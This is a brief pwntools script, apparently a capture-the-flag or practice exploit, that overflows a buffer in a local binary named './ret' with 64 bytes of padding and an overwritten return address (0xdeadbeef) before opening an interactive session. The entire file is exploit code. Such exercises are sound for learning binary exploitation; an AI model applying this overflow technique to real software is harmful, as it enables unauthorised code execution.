from pwn import *

r = process("./ret")

#r.sendline(b"aaa")
r.sendline(b"a"*64 + p64(0xdeadbeef))
#print(r.recvline())
#input("@")
r.interactive()
